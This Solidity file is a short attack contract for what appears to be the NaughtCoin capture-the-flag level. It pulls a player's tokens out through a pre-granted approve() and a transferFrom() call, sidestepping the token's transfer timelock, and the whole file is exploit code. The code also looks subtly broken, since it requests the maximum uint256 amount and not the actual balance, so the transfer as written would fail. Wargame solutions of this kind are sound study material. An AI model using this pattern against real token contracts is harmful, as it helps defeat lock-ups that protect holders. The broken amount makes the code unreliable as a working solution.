// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract NaughtCoinAttack {
    constructor(address tokenAddress, address player) {
        INaughtCoin token = INaughtCoin(tokenAddress);
        
        // The player must first call approve to allow this contract to spend their tokens.
        // This cannot be done inside the constructor since the player must sign the approve transaction.
        // So this contract assumes approval has been granted before deployment.
        
        // Transfer all tokens from player to this contract using transferFrom.
        require(token.transferFrom(player, address(this), type(uint256).max), "TransferFrom failed");
    }
}
